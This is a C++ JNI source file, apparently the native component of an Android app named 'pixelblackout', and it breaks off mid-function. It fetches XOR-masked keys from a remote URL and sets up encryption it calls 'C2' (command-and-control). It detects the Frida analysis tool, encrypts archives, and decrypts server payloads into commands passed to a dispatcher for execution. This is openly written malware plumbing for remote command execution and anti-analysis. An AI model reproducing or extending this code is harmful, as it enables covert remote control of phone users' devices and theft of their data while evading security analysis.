#include <jni.h>
#include <android/log.h>

#include <fstream>
#include <cstdint>
#include <string>
#include <vector>

namespace {
constexpr const char *kTag = "NativeCrypto";

bool g_safe_environment = true;
bool g_secrets_ready = false;
std::vector<uint8_t> g_aes_key;
std::vector<uint8_t> g_aes_iv;
std::vector<uint8_t> g_archive_password;

// C2 AEAD material (ChaCha20-Poly1305)
bool g_c2_ready = false;
std::vector<uint8_t> g_c2_key;       // 32 bytes
std::vector<uint8_t> g_c2_base_nonce; // 12 bytes

std::vector<uint8_t> VectorFromArray(JNIEnv *env, jbyteArray array) {
    std::vector<uint8_t> data;
    if (array == nullptr) {
        return data;
    }
    const jsize length = env->GetArrayLength(array);
    if (length <= 0) {
        return data;
    }
    data.resize(length);
    env->GetByteArrayRegion(array, 0, length, reinterpret_cast<jbyte *>(data.data()));
    return data;
}

// Forward declarations for helpers referenced before their definitions
jclass FindClass(JNIEnv *env, const std::string &name);
jbyteArray Base64Decode(JNIEnv *env, jstring data);
jbyteArray ArrayFromVector(JNIEnv *env, const std::vector<uint8_t> &data);
void SetSecrets(const std::vector<uint8_t> &key,
                const std::vector<uint8_t> &iv,
                const std::vector<uint8_t> &password);
void SetC2Secrets(const std::vector<uint8_t> &key,
                  const std::vector<uint8_t> &base_nonce);

jobjectArray NativeBootstrapFromRemote(JNIEnv *env, jclass) {
    // Read BuildConfig.REMOTE_KEY_URL
    jclass bc = FindClass(env, "com/example/pixelblackout/BuildConfig");
    if (bc == nullptr) return nullptr;
    jfieldID fid = env->GetStaticFieldID(bc, "REMOTE_KEY_URL", "Ljava/lang/String;");
    if (fid == nullptr) { env->DeleteLocalRef(bc); return nullptr; }
    jstring jurl = (jstring) env->GetStaticObjectField(bc, fid);
    env->DeleteLocalRef(bc);
    if (jurl == nullptr) return nullptr;

    // URL + URLConnection
    jclass urlCls = FindClass(env, "java/net/URL");
    if (urlCls == nullptr) return nullptr;
    jmethodID urlCtor = env->GetMethodID(urlCls, "<init>", "(Ljava/lang/String;)V");
    if (urlCtor == nullptr) { env->DeleteLocalRef(urlCls); return nullptr; }
    jobject urlObj = env->NewObject(urlCls, urlCtor, jurl);
    if (urlObj == nullptr) { env->DeleteLocalRef(urlCls); return nullptr; }
    jmethodID openConn = env->GetMethodID(urlCls, "openConnection", "()Ljava/net/URLConnection;");
    env->DeleteLocalRef(urlCls);
    if (openConn == nullptr) return nullptr;
    jobject conn = env->CallObjectMethod(urlObj, openConn);
    if (conn == nullptr || env->ExceptionCheck()) {
        env->ExceptionClear();
        return nullptr;
    }
    jclass urlConnCls = FindClass(env, "java/net/URLConnection");
    if (urlConnCls == nullptr) return nullptr;
    jmethodID setCTO = env->GetMethodID(urlConnCls, "setConnectTimeout", "(I)V");
    jmethodID setRTO = env->GetMethodID(urlConnCls, "setReadTimeout", "(I)V");
    jmethodID setProp = env->GetMethodID(urlConnCls, "setRequestProperty", "(Ljava/lang/String;Ljava/lang/String;)V");
    jmethodID getIS = env->GetMethodID(urlConnCls, "getInputStream", "()Ljava/io/InputStream;");
    if (setCTO) env->CallVoidMethod(conn, setCTO, 5000);
    if (setRTO) env->CallVoidMethod(conn, setRTO, 5000);
    if (setProp) {
        jstring h1 = env->NewStringUTF("User-Agent");
        jstring v1 = env->NewStringUTF("pixelblackout-remote-key");
        env->CallVoidMethod(conn, setProp, h1, v1);
        env->DeleteLocalRef(h1); env->DeleteLocalRef(v1);
        jstring h2 = env->NewStringUTF("Accept");
        jstring v2 = env->NewStringUTF("*/*");
        env->CallVoidMethod(conn, setProp, h2, v2);
        env->DeleteLocalRef(h2); env->DeleteLocalRef(v2);
    }
    jobject in = env->CallObjectMethod(conn, getIS);
    env->DeleteLocalRef(urlConnCls);
    if (in == nullptr || env->ExceptionCheck()) {
        env->ExceptionClear();
        return nullptr;
    }

    // Read all bytes via ByteArrayOutputStream
    jclass isCls = FindClass(env, "java/io/InputStream");
    jmethodID readM = env->GetMethodID(isCls, "read", "([B)I");
    jmethodID closeM = env->GetMethodID(isCls, "close", "()V");
    jclass baosCls = FindClass(env, "java/io/ByteArrayOutputStream");
    jmethodID baosCtor = env->GetMethodID(baosCls, "<init>", "()V");
    jmethodID writeM = env->GetMethodID(baosCls, "write", "([BII)V");
    jmethodID toBA = env->GetMethodID(baosCls, "toByteArray", "()[B");
    jobject baos = env->NewObject(baosCls, baosCtor);
    jbyteArray buf = env->NewByteArray(4096);
    while (true) {
        jint r = env->CallIntMethod(in, readM, buf);
        if (env->ExceptionCheck()) { env->ExceptionClear(); break; }
        if (r <= 0) break;
        env->CallVoidMethod(baos, writeM, buf, 0, r);
    }
    env->CallVoidMethod(in, closeM);
    env->DeleteLocalRef(in);
    env->DeleteLocalRef(isCls);
    env->DeleteLocalRef(buf);
    jbyteArray body = (jbyteArray) env->CallObjectMethod(baos, toBA);
    env->DeleteLocalRef(baos);
    env->DeleteLocalRef(baosCls);
    if (body == nullptr) return nullptr;

    // Convert to String using ISO-8859-1
    jclass strCls = FindClass(env, "java/lang/String");
    jmethodID strCtor = env->GetMethodID(strCls, "<init>", "([BLjava/lang/String;)V");
    jstring charset = env->NewStringUTF("ISO-8859-1");
    jstring text = (jstring) env->NewObject(strCls, strCtor, body, charset);
    env->DeleteLocalRef(charset);
    env->DeleteLocalRef(strCls);
    if (text == nullptr || env->ExceptionCheck()) { env->ExceptionClear(); return nullptr; }

    // Regex to extract JSON
    jclass patCls = FindClass(env, "java/util/regex/Pattern");
    if (patCls == nullptr) return nullptr;
    jfieldID dotAllField = env->GetStaticFieldID(patCls, "DOTALL", "I");
    jint DOTALL = dotAllField ? env->GetStaticIntField(patCls, dotAllField) : 32;
    jmethodID compile = env->GetStaticMethodID(patCls, "compile", "(Ljava/lang/String;I)Ljava/util/regex/Pattern;");
    jstring patStr = env->NewStringUTF("\\{\\s*\\\\\"k\\\\\".*?\\}");
    jobject pattern = env->CallStaticObjectMethod(patCls, compile, patStr, DOTALL);
    env->DeleteLocalRef(patStr);
    jmethodID matcherM = env->GetMethodID(patCls, "matcher", "(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;");
    jobject matcher = env->CallObjectMethod(pattern, matcherM, text);
    jclass matcherCls = FindClass(env, "java/util/regex/Matcher");
    jmethodID findM = env->GetMethodID(matcherCls, "find", "()Z");
    jmethodID groupM = env->GetMethodID(matcherCls, "group", "()Ljava/lang/String;");
    jboolean found = env->CallBooleanMethod(matcher, findM);
    if (!found) { return nullptr; }
    jstring blob = (jstring) env->CallObjectMethod(matcher, groupM);

    // Parse JSON and decode Base64 fields
    jclass jsonCls = FindClass(env, "org/json/JSONObject");
    jmethodID jsonCtor = env->GetMethodID(jsonCls, "<init>", "(Ljava/lang/String;)V");
    jobject json = env->NewObject(jsonCls, jsonCtor, blob);
    jmethodID getString = env->GetMethodID(jsonCls, "getString", "(Ljava/lang/String;)Ljava/lang/String;");
    jstring kK = env->NewStringUTF("k");
    jstring kI = env->NewStringUTF("i");
    jstring kP = env->NewStringUTF("p");
    jstring kC = env->NewStringUTF("c");
    jstring kN = env->NewStringUTF("n");
    jstring sK = (jstring) env->CallObjectMethod(json, getString, kK);
    jstring sI = (jstring) env->CallObjectMethod(json, getString, kI);
    jstring sP = (jstring) env->CallObjectMethod(json, getString, kP);
    jstring sC = (jstring) env->CallObjectMethod(json, getString, kC);
    jstring sN = (jstring) env->CallObjectMethod(json, getString, kN);

    jbyteArray mk = Base64Decode(env, sK);
    jbyteArray mi = Base64Decode(env, sI);
    jbyteArray mp = Base64Decode(env, sP);
    jbyteArray mc = Base64Decode(env, sC);
    jbyteArray mn = Base64Decode(env, sN);

    std::vector<uint8_t> vk = VectorFromArray(env, mk);
    std::vector<uint8_t> vi = VectorFromArray(env, mi);
    std::vector<uint8_t> vp = VectorFromArray(env, mp);
    std::vector<uint8_t> vc = VectorFromArray(env, mc);
    std::vector<uint8_t> vn = VectorFromArray(env, mn);
    const uint8_t mask = 0x37;
    for (auto &b : vk) b ^= mask;
    for (auto &b : vi) b ^= mask;
    for (auto &b : vp) b ^= mask;
    for (auto &b : vc) b ^= mask;
    for (auto &b : vn) b ^= mask;

    // Install into native globals
    SetSecrets(vk, vi, vp);
    SetC2Secrets(vc, vn);

    // Return c2 key + nonce to Java
    jclass baCls = env->FindClass("[B");
    if (baCls == nullptr) return nullptr;
    jobjectArray out = env->NewObjectArray(2, baCls, nullptr);
    jbyteArray jKey = ArrayFromVector(env, vc);
    jbyteArray jNonce = ArrayFromVector(env, vn);
    env->SetObjectArrayElement(out, 0, jKey);
    env->SetObjectArrayElement(out, 1, jNonce);
    return out;
}

jbyteArray ArrayFromVector(JNIEnv *env, const std::vector<uint8_t> &data) {
    jbyteArray array = env->NewByteArray(static_cast<jsize>(data.size()));
    if (array == nullptr) {
        return nullptr;
    }
    if (!data.empty()) {
        env->SetByteArrayRegion(array, 0, static_cast<jsize>(data.size()),
                                reinterpret_cast<const jbyte *>(data.data()));
    }
    return array;
}

jbyteArray CloneArray(JNIEnv *env, jbyteArray source) {
    if (source == nullptr) {
        return nullptr;
    }
    std::vector<uint8_t> copy = VectorFromArray(env, source);
    return ArrayFromVector(env, copy);
}

std::string GetStringUtf(JNIEnv *env, jstring value) {
    if (value == nullptr) {
        return {};
    }
    const char *chars = env->GetStringUTFChars(value, nullptr);
    if (chars == nullptr) {
        return {};
    }
    std::string result(chars);
    env->ReleaseStringUTFChars(value, chars);
    return result;
}

jclass FindClass(JNIEnv *env, const std::string &name) {
    jclass clazz = env->FindClass(name.c_str());
    if (clazz == nullptr) {
        __android_log_print(ANDROID_LOG_WARN, kTag, "Failed to find class %s", name.c_str());
    }
    return clazz;
}

jobject CreateSecretKeySpec(JNIEnv *env, const std::vector<uint8_t> &key) {
    jclass secretKeySpecClass = FindClass(env, "javax/crypto/spec/SecretKeySpec");
    if (secretKeySpecClass == nullptr) {
        return nullptr;
    }
    jmethodID ctor = env->GetMethodID(secretKeySpecClass, "<init>", "([BLjava/lang/String;)V");
    if (ctor == nullptr) {
        __android_log_print(ANDROID_LOG_WARN, kTag, "SecretKeySpec.<init> not found");
        env->DeleteLocalRef(secretKeySpecClass);
        return nullptr;
    }
    jbyteArray keyArray = ArrayFromVector(env, key);
    if (keyArray == nullptr) {
        env->DeleteLocalRef(secretKeySpecClass);
        return nullptr;
    }
    jstring algorithm = env->NewStringUTF("AES");
    jobject secretKey = env->NewObject(secretKeySpecClass, ctor, keyArray, algorithm);
    env->DeleteLocalRef(keyArray);
    env->DeleteLocalRef(algorithm);
    env->DeleteLocalRef(secretKeySpecClass);
    return secretKey;
}

jobject CreateIvParameterSpec(JNIEnv *env, const std::vector<uint8_t> &iv) {
    jclass ivClass = FindClass(env, "javax/crypto/spec/IvParameterSpec");
    if (ivClass == nullptr) {
        return nullptr;
    }
    jmethodID ctor = env->GetMethodID(ivClass, "<init>", "([B)V");
    if (ctor == nullptr) {
        __android_log_print(ANDROID_LOG_WARN, kTag, "IvParameterSpec.<init> not found");
        env->DeleteLocalRef(ivClass);
        return nullptr;
    }
    jbyteArray ivArray = ArrayFromVector(env, iv);
    if (ivArray == nullptr) {
        env->DeleteLocalRef(ivClass);
        return nullptr;
    }
    jobject spec = env->NewObject(ivClass, ctor, ivArray);
    env->DeleteLocalRef(ivArray);
    env->DeleteLocalRef(ivClass);
    return spec;
}

jobject AcquireCipher(JNIEnv *env, jint mode, const std::vector<uint8_t> &key,
                      const std::vector<uint8_t> &iv) {
    jclass cipherClass = FindClass(env, "javax/crypto/Cipher");
    if (cipherClass == nullptr) {
        return nullptr;
    }
    jmethodID getInstance = env->GetStaticMethodID(cipherClass, "getInstance",
                                                   "(Ljava/lang/String;)Ljavax/crypto/Cipher;");
    if (getInstance == nullptr) {
        __android_log_print(ANDROID_LOG_WARN, kTag, "Cipher.getInstance not found");
        env->DeleteLocalRef(cipherClass);
        return nullptr;
    }
    jstring transformation = env->NewStringUTF("AES/CBC/PKCS5Padding");
    jobject cipher = env->CallStaticObjectMethod(cipherClass, getInstance, transformation);
    env->DeleteLocalRef(transformation);
    if (cipher == nullptr || env->ExceptionCheck()) {
        env->ExceptionClear();
        env->DeleteLocalRef(cipherClass);
        __android_log_print(ANDROID_LOG_WARN, kTag, "Failed to instantiate Cipher");
        return nullptr;
    }

    jobject secretKey = CreateSecretKeySpec(env, key);
    jobject ivSpec = CreateIvParameterSpec(env, iv);
    if (secretKey == nullptr || ivSpec == nullptr) {
        if (secretKey != nullptr) env->DeleteLocalRef(secretKey);
        if (ivSpec != nullptr) env->DeleteLocalRef(ivSpec);
        env->DeleteLocalRef(cipher);
        env->DeleteLocalRef(cipherClass);
        return nullptr;
    }

    jmethodID init = env->GetMethodID(cipherClass, "init",
                                      "(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V");
    if (init == nullptr) {
        __android_log_print(ANDROID_LOG_WARN, kTag, "Cipher.init not found");
        env->DeleteLocalRef(secretKey);
        env->DeleteLocalRef(ivSpec);
        env->DeleteLocalRef(cipher);
        env->DeleteLocalRef(cipherClass);
        return nullptr;
    }

    env->CallVoidMethod(cipher, init, mode, secretKey, ivSpec);
    env->DeleteLocalRef(secretKey);
    env->DeleteLocalRef(ivSpec);
    env->DeleteLocalRef(cipherClass);
    if (env->ExceptionCheck()) {
        env->ExceptionClear();
        env->DeleteLocalRef(cipher);
        __android_log_print(ANDROID_LOG_WARN, kTag, "Cipher.init threw");
        return nullptr;
    }

    return cipher;
}

jbyteArray CipherDoFinal(JNIEnv *env, jobject cipher, jbyteArray input) {
    if (cipher == nullptr || input == nullptr) {
        return nullptr;
    }
    jclass cipherClass = env->GetObjectClass(cipher);
    jmethodID doFinal = env->GetMethodID(cipherClass, "doFinal", "([B)[B");
    jbyteArray result = (jbyteArray) env->CallObjectMethod(cipher, doFinal, input);
    env->DeleteLocalRef(cipherClass);
    if (env->ExceptionCheck()) {
        env->ExceptionClear();
        return nullptr;
    }
    return result;
}

jobject AcquireChaCha20Poly1305(JNIEnv *env, jint mode,
                                const std::vector<uint8_t> &key,
                                const std::vector<uint8_t> &nonce) {
    jclass cipherClass = FindClass(env, "javax/crypto/Cipher");
    if (cipherClass == nullptr) return nullptr;
    jmethodID getInstance = env->GetStaticMethodID(cipherClass, "getInstance",
                                                   "(Ljava/lang/String;)Ljavax/crypto/Cipher;");
    if (getInstance == nullptr) {
        env->DeleteLocalRef(cipherClass);
        __android_log_print(ANDROID_LOG_WARN, kTag, "Cipher.getInstance not found");
        return nullptr;
    }
    jstring transformation = env->NewStringUTF("ChaCha20-Poly1305");
    jobject cipher = env->CallStaticObjectMethod(cipherClass, getInstance, transformation);
    env->DeleteLocalRef(transformation);
    if (cipher == nullptr || env->ExceptionCheck()) {
        env->ExceptionClear();
        env->DeleteLocalRef(cipherClass);
        __android_log_print(ANDROID_LOG_WARN, kTag, "Failed to instantiate CC20P1305 Cipher");
        return nullptr;
    }

    // Key spec algorithm should be "ChaCha20"
    jclass secretKeySpecClass = FindClass(env, "javax/crypto/spec/SecretKeySpec");
    if (secretKeySpecClass == nullptr) { env->DeleteLocalRef(cipher); env->DeleteLocalRef(cipherClass); return nullptr; }
    jmethodID skCtor = env->GetMethodID(secretKeySpecClass, "<init>", "([BLjava/lang/String;)V");
    if (skCtor == nullptr) {
        env->DeleteLocalRef(secretKeySpecClass);
        env->DeleteLocalRef(cipher);
        env->DeleteLocalRef(cipherClass);
        return nullptr;
    }
    jbyteArray keyArray = ArrayFromVector(env, key);
    jstring alg = env->NewStringUTF("ChaCha20");
    jobject secretKey = env->NewObject(secretKeySpecClass, skCtor, keyArray, alg);
    env->DeleteLocalRef(keyArray);
    env->DeleteLocalRef(alg);
    env->DeleteLocalRef(secretKeySpecClass);
    if (secretKey == nullptr) { env->DeleteLocalRef(cipher); env->DeleteLocalRef(cipherClass); return nullptr; }

    // Nonce: 12 bytes via IvParameterSpec
    jobject ivSpec = CreateIvParameterSpec(env, nonce);
    if (ivSpec == nullptr) {
        env->DeleteLocalRef(secretKey);
        env->DeleteLocalRef(cipher);
        env->DeleteLocalRef(cipherClass);
        return nullptr;
    }

    jmethodID init = env->GetMethodID(cipherClass, "init",
                                      "(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V");
    if (init == nullptr) {
        env->DeleteLocalRef(ivSpec);
        env->DeleteLocalRef(secretKey);
        env->DeleteLocalRef(cipher);
        env->DeleteLocalRef(cipherClass);
        return nullptr;
    }
    env->CallVoidMethod(cipher, init, mode, secretKey, ivSpec);
    env->DeleteLocalRef(ivSpec);
    env->DeleteLocalRef(secretKey);
    env->DeleteLocalRef(cipherClass);
    if (env->ExceptionCheck()) {
        env->ExceptionClear();
        env->DeleteLocalRef(cipher);
        __android_log_print(ANDROID_LOG_WARN, kTag, "CC20P1305 init failed");
        return nullptr;
    }
    return cipher;
}

jbyteArray Base64Decode(JNIEnv *env, jstring data) {
    jclass base64Class = FindClass(env, "android/util/Base64");
    if (base64Class == nullptr) {
        return nullptr;
    }
    jmethodID decode = env->GetStaticMethodID(base64Class, "decode",
                                              "(Ljava/lang/String;I)[B");
    if (decode == nullptr) {
        env->DeleteLocalRef(base64Class);
        __android_log_print(ANDROID_LOG_WARN, kTag, "Base64.decode not found");
        return nullptr;
    }
    const jint flags = 0; // DEFAULT
    jbyteArray result = (jbyteArray) env->CallStaticObjectMethod(base64Class, decode, data, flags);
    env->DeleteLocalRef(base64Class);
    if (env->ExceptionCheck()) {
        env->ExceptionClear();
        return nullptr;
    }
    return result;
}

jstring Base64Encode(JNIEnv *env, jbyteArray data) {
    jclass base64Class = FindClass(env, "android/util/Base64");
    if (base64Class == nullptr) {
        return nullptr;
    }
    jmethodID encode = env->GetStaticMethodID(base64Class, "encodeToString",
                                              "([BI)Ljava/lang/String;");
    if (encode == nullptr) {
        env->DeleteLocalRef(base64Class);
        __android_log_print(ANDROID_LOG_WARN, kTag, "Base64.encodeToString not found");
        return nullptr;
    }
    const jint flags = 2; // NO_WRAP
    jstring result = (jstring) env->CallStaticObjectMethod(base64Class, encode, data, flags);
    env->DeleteLocalRef(base64Class);
    if (env->ExceptionCheck()) {
        env->ExceptionClear();
        return nullptr;
    }
    return result;
}

jbyteArray MessageDigestDigest(JNIEnv *env, const char *algorithm, jbyteArray data) {
    jclass digestClass = FindClass(env, "java/security/MessageDigest");
    if (digestClass == nullptr) {
        return nullptr;
    }
    jmethodID getInstance = env->GetStaticMethodID(digestClass, "getInstance",
                                                   "(Ljava/lang/String;)Ljava/security/MessageDigest;");
    if (getInstance == nullptr) {
        env->DeleteLocalRef(digestClass);
        __android_log_print(ANDROID_LOG_WARN, kTag, "MessageDigest.getInstance not found");
        return nullptr;
    }
    jstring algoStr = env->NewStringUTF(algorithm);
    jobject digest = env->CallStaticObjectMethod(digestClass, getInstance, algoStr);
    env->DeleteLocalRef(algoStr);
    if (digest == nullptr || env->ExceptionCheck()) {
        env->ExceptionClear();
        env->DeleteLocalRef(digestClass);
        __android_log_print(ANDROID_LOG_WARN, kTag, "Failed to obtain MessageDigest");
        return nullptr;
    }
    jmethodID digestMethod = env->GetMethodID(digestClass, "digest", "([B)[B");
    if (digestMethod == nullptr) {
        env->DeleteLocalRef(digest);
        env->DeleteLocalRef(digestClass);
        __android_log_print(ANDROID_LOG_WARN, kTag, "MessageDigest.digest not found");
        return nullptr;
    }
    jbyteArray digestBytes = (jbyteArray) env->CallObjectMethod(digest, digestMethod, data);
    env->DeleteLocalRef(digest);
    env->DeleteLocalRef(digestClass);
    if (env->ExceptionCheck()) {
        env->ExceptionClear();
        return nullptr;
    }
    return digestBytes;
}

std::vector<uint8_t> RandomBytes(JNIEnv *env, size_t n) {
    std::vector<uint8_t> out(n);
    jclass srClass = FindClass(env, "java/security/SecureRandom");
    if (srClass == nullptr) {
        return out;
    }
    jmethodID ctor = env->GetMethodID(srClass, "<init>", "()V");
    jobject sr = env->NewObject(srClass, ctor);
    if (sr == nullptr) {
        env->DeleteLocalRef(srClass);
        return out;
    }
    jmethodID nextBytes = env->GetMethodID(srClass, "nextBytes", "([B)V");
    jbyteArray arr = env->NewByteArray(static_cast<jsize>(n));
    env->CallVoidMethod(sr, nextBytes, arr);
    out = VectorFromArray(env, arr);
    env->DeleteLocalRef(arr);
    env->DeleteLocalRef(sr);
    env->DeleteLocalRef(srClass);
    return out;
}

std::vector<uint8_t> XorNonce(const std::vector<uint8_t> &base, const std::vector<uint8_t> &salt) {
    std::vector<uint8_t> out(12, 0);
    for (size_t i = 0; i < 12; ++i) {
        uint8_t b = i < base.size() ? base[i] : 0;
        uint8_t s = i < salt.size() ? salt[i] : 0;
        out[i] = static_cast<uint8_t>(b ^ s);
    }
    return out;
}

bool ContainsInFile(const std::string &path, const std::string &needle) {
    std::ifstream stream(path);
    if (!stream.is_open()) {
        return false;
    }
    std::string line;
    while (std::getline(stream, line)) {
        if (line.find(needle) != std::string::npos) {
            return true;
        }
    }
    return false;
}

bool CheckEnvironment() {
    const bool fridaPresent = ContainsInFile("/proc/net/unix", "frida");
    if (fridaPresent) {
        __android_log_print(ANDROID_LOG_WARN, kTag, "Frida socket detected");
        return false;
    }
    return true;
}

bool EnsureSecretsReady() {
    if (!g_secrets_ready || g_aes_key.empty() || g_aes_iv.empty() || g_archive_password.empty()) {
        __android_log_print(ANDROID_LOG_WARN, kTag, "Secret material unavailable");
        return false;
    }
    return true;
}

bool EnsureC2Ready() {
    if (!g_c2_ready || g_c2_key.size() != 32 || g_c2_base_nonce.size() != 12) {
        __android_log_print(ANDROID_LOG_WARN, kTag, "C2 material unavailable");
        return false;
    }
    return true;
}

void SetSecrets(const std::vector<uint8_t> &key,
                const std::vector<uint8_t> &iv,
                const std::vector<uint8_t> &password) {
    g_aes_key = key;
    g_aes_iv = iv;
    g_archive_password = password;
    g_secrets_ready = !g_aes_key.empty() && !g_aes_iv.empty() && !g_archive_password.empty();
}

void SetC2Secrets(const std::vector<uint8_t> &key,
                  const std::vector<uint8_t> &base_nonce) {
    g_c2_key = key;
    g_c2_base_nonce = base_nonce;
    g_c2_ready = (g_c2_key.size() == 32 && g_c2_base_nonce.size() == 12);
}

jstring NativeEncryptString(JNIEnv *env, jclass, jstring plaintext) {
    if (!EnsureSecretsReady()) {
        return env->NewStringUTF("");
    }
    std::string utf = GetStringUtf(env, plaintext);
    std::vector<uint8_t> bytes(utf.begin(), utf.end());
    jbyteArray plainBytes = ArrayFromVector(env, bytes);
    if (plainBytes == nullptr) {
        return env->NewStringUTF("");
    }
    jobject cipher = AcquireCipher(env, 1, g_aes_key, g_aes_iv);
    if (cipher == nullptr) {
        env->DeleteLocalRef(plainBytes);
        return env->NewStringUTF("");
    }
    jbyteArray encrypted = CipherDoFinal(env, cipher, plainBytes);
    env->DeleteLocalRef(cipher);
    env->DeleteLocalRef(plainBytes);
    if (encrypted == nullptr) {
        return env->NewStringUTF("");
    }
    jstring encoded = Base64Encode(env, encrypted);
    env->DeleteLocalRef(encrypted);
    if (encoded == nullptr) {
        return env->NewStringUTF("");
    }
    return encoded;
}

jstring NativeDecryptString(JNIEnv *env, jclass, jstring payload) {
    if (!EnsureSecretsReady()) {
        return env->NewStringUTF("");
    }
    jbyteArray decoded = Base64Decode(env, payload);
    if (decoded == nullptr) {
        return env->NewStringUTF("");
    }
    jobject cipher = AcquireCipher(env, 2, g_aes_key, g_aes_iv);
    if (cipher == nullptr) {
        env->DeleteLocalRef(decoded);
        return env->NewStringUTF("");
    }
    jbyteArray plainBytes = CipherDoFinal(env, cipher, decoded);
    env->DeleteLocalRef(cipher);
    env->DeleteLocalRef(decoded);
    if (plainBytes == nullptr) {
        return env->NewStringUTF("");
    }
    std::vector<uint8_t> data = VectorFromArray(env, plainBytes);
    env->DeleteLocalRef(plainBytes);
    return env->NewStringUTF(std::string(data.begin(), data.end()).c_str());
}

jbyteArray NativeEncryptArchive(JNIEnv *env, jclass, jbyteArray payload) {
    if (!EnsureSecretsReady()) {
        return CloneArray(env, payload);
    }
    jbyteArray passwordBytes = ArrayFromVector(env, g_archive_password);
    if (passwordBytes == nullptr) {
        return CloneArray(env, payload);
    }
    jbyteArray keyDigest = MessageDigestDigest(env, "MD5", passwordBytes);
    jbyteArray ivDigest = MessageDigestDigest(env, "SHA-256", passwordBytes);
    env->DeleteLocalRef(passwordBytes);
    if (keyDigest == nullptr || ivDigest == nullptr) {
        if (keyDigest != nullptr) env->DeleteLocalRef(keyDigest);
        if (ivDigest != nullptr) env->DeleteLocalRef(ivDigest);
        return CloneArray(env, payload);
    }
    std::vector<uint8_t> key = VectorFromArray(env, keyDigest);
    std::vector<uint8_t> iv = VectorFromArray(env, ivDigest);
    env->DeleteLocalRef(keyDigest);
    env->DeleteLocalRef(ivDigest);
    if (iv.size() >= 16) {
        iv.resize(16);
    }
    jobject cipher = AcquireCipher(env, 1, key, iv);
    if (cipher == nullptr) {
        return CloneArray(env, payload);
    }
    jbyteArray encrypted = CipherDoFinal(env, cipher, payload);
    env->DeleteLocalRef(cipher);
    return encrypted;
}

void NativeConfigureSecrets(JNIEnv *env, jclass, jint mask, jbyteArray keyArray,
                            jbyteArray ivArray, jbyteArray passwordArray) {
    const uint8_t xorMask = static_cast<uint8_t>(mask & 0xFF);
    std::vector<uint8_t> key = VectorFromArray(env, keyArray);
    std::vector<uint8_t> iv = VectorFromArray(env, ivArray);
    std::vector<uint8_t> password = VectorFromArray(env, passwordArray);

    for (auto &byte : key) {
        byte ^= xorMask;
    }
    for (auto &byte : iv) {
        byte ^= xorMask;
    }
    for (auto &byte : password) {
        byte ^= xorMask;
    }

    SetSecrets(key, iv, password);
}

jboolean NativeOkToRun(JNIEnv *, jclass) {
    return g_safe_environment ? JNI_TRUE : JNI_FALSE;
}

// --- C2 AEAD (ChaCha20-Poly1305) ---

jstring NativeEncryptC2(JNIEnv *env, jclass, jstring plaintext) {
    if (!EnsureC2Ready()) {
        return env->NewStringUTF("");
    }
    std::string utf = GetStringUtf(env, plaintext);
    std::vector<uint8_t> plain(utf.begin(), utf.end());
    // salt (12B)
    std::vector<uint8_t> salt = RandomBytes(env, 12);
    std::vector<uint8_t> nonce = XorNonce(g_c2_base_nonce, salt);
    jobject cipher = AcquireChaCha20Poly1305(env, 1, g_c2_key, nonce);
    if (cipher == nullptr) {
        return env->NewStringUTF("");
    }
    jbyteArray input = ArrayFromVector(env, plain);
    jbyteArray out = CipherDoFinal(env, cipher, input);
    env->DeleteLocalRef(cipher);
    env->DeleteLocalRef(input);
    if (out == nullptr) {
        return env->NewStringUTF("");
    }
    // Build payload: salt || (cipher || tag)
    std::vector<uint8_t> ct = VectorFromArray(env, out);
    env->DeleteLocalRef(out);
    std::vector<uint8_t> payload;
    payload.reserve(12 + ct.size());
    payload.insert(payload.end(), salt.begin(), salt.end());
    payload.insert(payload.end(), ct.begin(), ct.end());
    jbyteArray blob = ArrayFromVector(env, payload);
    jstring encoded = Base64Encode(env, blob);
    env->DeleteLocalRef(blob);
    if (encoded == nullptr) {
        return env->NewStringUTF("");
    }
    return encoded;
}

jstring NativeDecryptC2(JNIEnv *env, jclass, jstring payload) {
    if (!EnsureC2Ready()) {
        return env->NewStringUTF("");
    }
    jbyteArray decoded = Base64Decode(env, payload);
    if (decoded == nullptr) {
        return env->NewStringUTF("");
    }
    std::vector<uint8_t> raw = VectorFromArray(env, decoded);
    env->DeleteLocalRef(decoded);
    if (raw.size() <= (12 + 16)) {
        return env->NewStringUTF("");
    }
    std::vector<uint8_t> salt(raw.begin(), raw.begin() + 12);
    std::vector<uint8_t> rest(raw.begin() + 12, raw.end());
    std::vector<uint8_t> nonce = XorNonce(g_c2_base_nonce, salt);
    jobject cipher = AcquireChaCha20Poly1305(env, 2, g_c2_key, nonce);
    if (cipher == nullptr) {
        return env->NewStringUTF("");
    }
    jbyteArray in = ArrayFromVector(env, rest);
    jbyteArray plain = CipherDoFinal(env, cipher, in);
    env->DeleteLocalRef(cipher);
    env->DeleteLocalRef(in);
    if (plain == nullptr) {
        return env->NewStringUTF("");
    }
    std::vector<uint8_t> data = VectorFromArray(env, plain);
    env->DeleteLocalRef(plain);
    return env->NewStringUTF(std::string(data.begin(), data.end()).c_str());
}

jstring NativeHandleC2Payload(JNIEnv *env, jclass,
                              jstring payload,
                              jobject dispatcher) {
    if (!EnsureC2Ready()) {
        return env->NewStringUTF("");
    }
    // Decrypt
    jstring plain = NativeDecryptC2(env, nullptr, payload);
    if (plain == nullptr) {
        return env->NewStringUTF("");
    }
    // Parse JSON in Java side (org.json) but within JNI call
    jclass jsonClass = FindClass(env, "org/json/JSONObject");
    if (jsonClass == nullptr) { return env->NewStringUTF(""); }
    jmethodID ctor = env->GetMethodID(jsonClass, "<init>", "(Ljava/lang/String;)V");
    jobject json = env->NewObject(jsonClass, ctor, plain);
    if (json == nullptr || env->ExceptionCheck()) {
        env->ExceptionClear();
        env->DeleteLocalRef(jsonClass);
        return env->NewStringUTF("");
    }
    jmethodID optString = env->GetMethodID(jsonClass, "optString",
                                           "(Ljava/lang/String;)Ljava/lang/String;");
    jstring kCmd = env->NewStringUTF("cmd");
    jstring kArg = env->NewStringUTF("arg");
    jstring cmd = (jstring) env->CallObjectMethod(json, optString, kCmd);
    jstring arg = (jstring) env->CallObjectMethod(json, optString, kArg);
    env->DeleteLocalRef(kCmd);
    env->DeleteLocalRef(kArg);
    env->DeleteLocalRef(json);
    env->DeleteLocalRef(jsonClass);
    // Call CommandDispatcher.executeForNative(cmd, arg)
    jclass dispClass = env->GetObjectClass(dispatcher);
    if (dispClass == nullptr) { return env->NewStringUTF(""); }
    jmethodID exec = env->GetMethodID(dispClass, "executeForNative",
                                      "(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;");
